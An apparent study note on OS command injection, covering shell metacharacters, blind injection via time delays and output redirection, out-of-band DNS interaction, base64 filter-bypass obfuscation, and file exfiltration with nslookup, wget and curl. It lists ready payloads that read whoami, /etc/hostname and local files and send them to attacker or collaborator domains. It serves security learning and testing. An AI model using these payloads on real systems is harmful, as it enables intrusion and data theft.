![[OS Command Injection.jpg]]
# Command Injection

# Recon

First step is to perform app mapping and identify any instances where the app appears to be interacting with the underlying OS by calling external processes or accessing the file system. The app may issue OS system commands containing any item of user supplied data (every URL, parameters, cookies, etc..).

It is recommended to probe all these instances for OS command injection.
# Background Knowledge

The characters `;`, `|` and `&` and newline `%0a` can be used to batch multiple commands one after another. Each of these characters should be used when probing for command injection vulnerabilities, as the app may reject some inputs but accept others.

The backtick \` character can also be used to encapsulate a separate command within a data item being processed by the original command. This will cause the interpreter to execute this command first before continuing to execute the remaining command string:

```bash
nslookup `whoami`.server-you-control.net
```

>[!info]
>Note that the different shell metacharacters have subtly different behaviours that may affect whether they work in certain situations, and whether they allow in-band retrieval of command output or are useful for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command.

Many times the injected characters need to be encoded, since they can interfere with the structure of the URL/body parameters. For example, the & and space characters may need to be URL encoded (%26 and %20) in order to be treated as part of the injection payload.

Some useful commands include:

| Purpose of command    | Linux       | Windows       |
| --------------------- | ----------- | ------------- |
| Name of current user  | whoami      | whoami        |
| Operating system      | uname -a    | ver           |
| Network configuration | ifconfig    | ipconfig /all |
| Network connections   | netstat -an | netstat -an   |
| Running processes     | ps -ef      | tasklist      |
# Simple Command Injection

As an example, a shopping app lets the user view if an item is in stock. The app may query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command such as:

```bash
stockreport.pl 381 29
```

The app may have no defenses against OS command injection, meaning an attacker can submit input to execute commands such as:

```bash
& echo hello &
```

If it gets submitted as an argument, the full command may be:

```bash
stockreport.pl & echo hello & 29
```

The `echo` causes the string to be echoed in the output. The `&` is a character to cause three separate commands to execute, one after another. The output may be as follows:

```bash
Error - productID was not provided
aiwefwlguh
29: command not found
```

>[!info]
>Placing the additional command separator `&` after the injected command is useful because it separates the injected command from whatever follows the injection point.

For example, there may be a stock check feature that sends a request with a store ID and product ID. If so, it may run a command taking two parameters. Try injecting various characters like `&`, `&&`, `|` or `||` as well as `;` such as:

```http
2 | whoami
```

![[Pipe Whoami.png]]

If pipe does not work, try other characters such as `&` as well as URL encoding the characters.
# Blind OS Command Injection

Many OS command injections are blind. A site may let users submit feedback about the site by entering an email and feedback message. The server-side app may generate an email to a site admin containing feedback by calling the mail program:

```bash
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

Any output from the mail command is not returned. If so, it can still be exploited.
# Blind Command Injection via Time Delays

Try using an injected command to trigger a time delay, enabling you to confirm it was executed based on the response time. The `ping` command can be used to specify the number of ICMP packets to send, controlling the time taken for the command to run:

```bash
& ping -c 127.0.0.1 &
```

To maximize chances of identifying OS command injection if the app is filtering certain command separators, submit each of the following to each input fields and analyse the time taken for the app to respond:

```bash
| ping -i 30 127.0.0.1 |
| ping -n 30 127.0.0.1 |
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
; ping -i 30 127.0.0.1 ;
%0a ping -i 30 127.0.0.1 %0a
` ping 127.0.0.1 `
```

As an example, there may be a feedback form requiring info like name, email, subject and messages. Submitting the feedback may not return the direct response. Try injecting various payloads into the parameters submitted to sleep for 10 seconds:

![[Test Sleep.png]]

Test each field and see if it sleeps for 10 seconds. If not, try various other payloads such as the double pipe

![[Ping Test.png]]
# Blind Command Injection Exfiltration - Redirection

To exploit blind command injection, you can redirect the output from the injected command into a file within the web root that can be retrieved by the browser. If the app serves static resources from the filesystem `/var/www/static`, then submit the following:

```bash
& whoami > /var/www/static/whoami.txt &
```

For example, there may be a vulnerable email parameter in a feedback form. Try submitting various payloads to try and redirect the output to a specified file/directory such as `/var/www/images`:

![[Output TXT.png]]

If vulnerable, navigate to the directory.

>[!info]
>To find a directory or how to access the image, look at other images/static resources on the page.
# Blind Command Injection - OAST Interaction

You can use an injected command to trigger an out-of-band network interaction with a system like Collaborator such as:

```bash
& nslookup COLLABORATOR-DOMAIN &
```

This causes the `nslookup` command to cause a DNS lookup for the specified domain.

As an example, there may be a vulnerable parameter in a feedback form that is susceptible to blind OS command injection. If so, try injecting various payloads such as:

![[Collaborator.png]]

Check Collaborator for any DNS requests for successful OAST interaction.














# DNS Data Exfiltration

Using backticks and `$command`:

```bash
; nslookup $(whoami).attacker-server.net ;
; nslookup `whoami`.attacker-server.net ;
```
# Obfuscation Payloads

The goal here is to learn how the following payload can be obfuscated to bypass filters for data exfiltration. The payloads can be combined when exploiting template injection or other vulnerabilities that use OS command injection.

Original payload:

```bash
||nslookup+$(cat+/etc/hostname).fp8v70vp.oastify.com||
```

Obfuscation using the "echo" command to help obfuscate the word "hostname":

```bash
||nslookup+$(cat+/etc/ho`echo+'stname'`).fp8w54v70vp.oastify.com||
```

Obfuscation using base64 to hide the file name:

```bash
||nslookup+$(cat+`echo+'L2V0Yy9ob3N0bmFtZQ=='+|+base64+--decode`).fp8v70vp.oastify.com||
```

Decoded payload:

```bash
||nslookup $(cat `echo 'L2V0Yy9ob3N0bmFtZQ==' | base64 --decode`).fp8w70vp.oastify.com||
```

Obfuscation using base encoding to hide the whole command:

```bash
||nslookup+$(`echo+'Y2F0IC9ldGMvaG9zdG5hbWU='+|+base64+--decode`).er9v70tk9lz9o.oastify.com||
```
# Other Methods

Some other methods to achieve data exfiltration include:

```bash
nslookup -q=cname $(cat /home/test).burp.oastify.com
wget http://burp-collab.com --post-file=/home/test
curl http://wcq0jo8.oastify.com -d @/home/test
```

